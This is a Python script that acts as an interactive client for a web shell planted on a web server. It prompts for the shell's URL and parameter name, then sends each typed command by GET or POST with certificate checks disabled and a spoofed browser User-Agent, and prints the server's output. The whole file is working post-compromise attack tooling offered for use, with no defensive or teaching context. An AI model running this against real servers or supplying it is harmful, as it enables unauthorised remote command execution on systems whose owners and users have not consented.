import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def connect_webshell():
    print("--------------------------------------------------")
    print("   Python Interactive Webshell Connector")
    print("   Type 'exit' or 'quit' to close")
    print("--------------------------------------------------")

    target_url = input("\nEnter the Webshell URL: ").strip()
    if not target_url:
        print("[-] URL cannot be empty!")
        return

    param_name = input("Enter the connection parameter name (default 'cmd'): ").strip()
    if not param_name:
        param_name = "cmd"

    method = input("Select request method (1: POST / 2: GET, default 1): ").strip()
    use_get = method == "2"

    print(f"\n[+] Connecting to: {target_url}")
    print(f"[+] Using parameter: {param_name}")
    print(f"[+] Request method: {'GET' if use_get else 'POST'}")
    print("--------------------------------------------------")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    while True:
        try:
            user_command = input("shell> ").strip()

            if user_command.lower() in ['exit', 'quit', 'bye']:
                print("\n[+] Connection closed.")
                break

            if not user_command:
                continue

            try:
                if use_get:
                    response = requests.get(
                        target_url,
                        params={param_name: user_command},
                        headers=headers,
                        verify=False,
                        timeout=10
                    )
                else:
                    response = requests.post(
                        target_url,
                        data={param_name: user_command},
                        headers=headers,
                        verify=False,
                        timeout=10
                    )

                response.encoding = response.apparent_encoding
                content = response.text.strip()
                print(content)

            except requests.exceptions.RequestException as e:
                print(f"\n[-] Connection error: {e}")

        except KeyboardInterrupt:
            print("\n\n[+] Interrupted by user.")
            break
        except Exception as e:
            print(f"\n[-] Unknown error: {e}")

if __name__ == '__main__':
    connect_webshell()
